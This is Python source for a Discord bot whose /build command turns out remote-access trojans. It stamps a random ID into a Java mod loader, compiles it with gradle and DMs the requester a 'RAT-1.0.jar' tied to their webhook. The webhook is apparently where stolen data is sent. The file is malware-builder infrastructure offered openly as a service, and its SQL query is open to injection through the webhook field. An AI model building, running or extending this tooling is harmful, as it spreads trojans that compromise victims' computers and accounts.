from discord.ext import commands
import discord, discord.ext, checkwebhook, string, random, os, json, mysql.connector

client = commands.Bot()
cwd = os.getcwd()

data = open("./config.json")
config = json.load(data)
token = config["discord-bot"]["token"]

invalidwebhookembed = discord.Embed(title="❌ You added an invalid webhook", description='Your webhook responded with an error code. Try again!', color=0x7289DA)
successembed = discord.Embed(title="Success! 🎉", description="Your RAT has been built successfully.", color=0x7289DA)
invalidwebhookembed.add_field(name="If you believe this is false", value="message a staff member.")
successembed.add_field(name="A file has been sent to your direct messages!", value="If you did not recieve one, make sure you can recieve dms from members in your servers.")
successembed.set_footer(text="Thank you! Made by Gute Nacht")

def connect():
    db = mysql.connector.connect(
        host=config["mysql"]["host"],
        user=config["mysql"]["user"],
        password=config["mysql"]["password"],
        database=config["mysql"]["database"]
    )
    return db

def generate_rid():
    rid = ""
    for i in range(3):
        if rid == "":
            rid = rid + ''.join(random.choices(string.ascii_lowercase + string.digits, k=10))
        else:
            rid = rid + "-" + ''.join(random.choices(string.ascii_lowercase + string.digits, k=10))
    
    print("Generated RID: " + rid)
    return rid

@client.event
async def on_ready():
    print("Bot is ready")

@client.slash_command(name="build", description="builds a rat for you")
async def build(ctx, webhook):
    rid = generate_rid()
    webhookurl = webhook
    db = connect()
    cursor = db.cursor()

    if (checkwebhook.check_webhook(webhook) == False):
        try:
            await ctx.respond(embed=invalidwebhookembed)
        except:
            pass
        return
    try:
        await ctx.respond(embed=discord.Embed(description=f"`✅` Your file is being built. Please wait about 25 seconds...", color=0x7289DA), ephemeral=True)
    except:
        pass

    path = f"{cwd}/mod/src/main/java/dev/gutenacht/loader/Loader.java"
    file = open(path, "r")
    list_of_lines = file.readlines()
    list_of_lines[18] = f'    public static final String rid = "{rid}";\n'
    file = open(path, "w")
    file.writelines(list_of_lines)
    file.close()

    os.chdir(f"{cwd}/mod")
    os.system("gradlew build")

    cursor.execute(f"INSERT INTO rats (rid, webhook) VALUES ('{rid}', '{webhookurl}')")
    db.commit()

    try:
        await ctx.respond(embed=successembed, ephemeral=True)
    except:
        pass
    await ctx.author.send(file=discord.File(f"{cwd}/mod/build/libs/RAT-1.0.jar"))
    print("Sent file to " + str(ctx.author))

client.run(token)